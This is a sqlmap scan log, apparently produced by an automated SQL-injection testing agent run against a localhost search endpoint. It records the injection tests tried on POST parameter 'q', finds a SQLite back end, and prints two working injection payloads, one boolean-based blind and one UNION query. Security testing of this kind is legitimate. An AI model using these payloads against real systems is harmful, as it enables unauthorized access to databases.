        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:05:05 /2025-09-26/

[12:05:07] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap' as the output directory
[12:05:08] [INFO] testing connection to the target URL
[12:05:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:05:08] [INFO] testing if the target URL content is stable
[12:05:08] [INFO] target URL content is stable
[12:05:08] [INFO] testing if POST parameter 'q' is dynamic
[12:05:09] [WARNING] POST parameter 'q' does not appear to be dynamic
[12:05:09] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
[12:05:09] [INFO] testing for SQL injection on POST parameter 'q'
[12:05:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:05:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[12:05:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[12:05:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[12:05:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[12:05:10] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[12:05:11] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[12:05:11] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[12:05:11] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[12:05:12] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[12:05:12] [INFO] POST parameter 'q' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (1) values? [Y/n] Y
[12:05:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:05:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:05:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:05:12] [INFO] target URL appears to have 2 columns in query
[12:05:12] [INFO] POST parameter 'q' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 323 HTTP(s) requests:
---
Parameter: q (POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: q=test' AND CASE WHEN 9236=9236 THEN 9236 ELSE JSON(CHAR(119,116,97,84)) END-- ReLC

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: q=test' UNION ALL SELECT CHAR(113,113,122,98,113)||CHAR(74,104,98,90,71,67,65,83,73,111,83,70,98,76,117,85,113,66,70,105,87,106,110,89,68,89,120,106,80,104,114,115,75,113,88,107,88,90,90,111)||CHAR(113,107,122,118,113),NULL-- BFLv
---
[12:05:12] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[12:05:12] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 131 times
[12:05:12] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap\localhost'

[*] ending @ 12:05:12 /2025-09-26/

